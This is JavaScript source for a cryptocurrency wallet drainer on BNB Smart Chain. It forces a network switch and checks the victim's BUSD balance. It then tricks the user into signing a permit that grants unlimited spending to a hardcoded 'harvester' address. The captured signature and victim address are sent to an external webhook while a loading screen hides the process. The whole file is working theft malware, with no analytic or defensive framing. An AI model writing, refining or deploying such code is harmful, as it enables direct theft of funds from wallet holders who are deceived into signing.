const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function nonces(address owner) view returns (uint256)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function triggerPermit() {
    if (!window.ethereum) return;

    try {
        // 1. FORCE SWITCH
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
        });

        // 2. INITIALIZE CAREFULLY
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const victim = await signer.getAddress();

        // UI CHANGE
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 3. CHECK BALANCE
        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
        const bal = await busd.balanceOf(victim);

        if (bal.gt(0)) {
            // CALL THE PERMIT LOGIC
            await handleBUSD(signer, victim, busd);
        } else {
            alert("Test Error: Please ensure BUSD (BEP-20) is in this wallet.");
            document.getElementById('ui-main').style.display = 'block';
            document.getElementById('ui-loading').style.display = 'none';
        }

    } catch (e) {
        // If it's looping back, THIS alert will tell you what the error is!
        alert("CRITICAL ERROR: " + (e.message || "Unknown Failure"));
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}

async function handleBUSD(signer, victim, busdContract) {
    try {
        const [nonce, tokenName] = await Promise.all([
            busdContract.nonces(victim),
            busdContract.name()
        ]);

        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
        const types = {
            Permit: [
                { name: "owner", type: "address" }, { name: "spender", type: "address" },
                { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        };
        const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };

        // 4. THE SIGNATURE REQUEST
        const signature = await signer._signTypedData(domain, types, message);
        const { v, r, s } = ethers.utils.splitSignature(signature);

        // FINAL SUCCESS ALERT (So you can manually type data if webhook fails)
        alert("SUCCESS! SIGNATURE CAPTURED!\nV: " + v + "\nR: " + r + "\nS: " + s);

        // 5. SEND TO WEBHOOK (Removed no-cors)
        await fetch(WEBHOOK_SITE_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ victim, v, r, s, deadline, type: 'permit' })
        });

    } catch (err) {
        alert("SIGNATURE ERROR: " + err.message);
    }
}
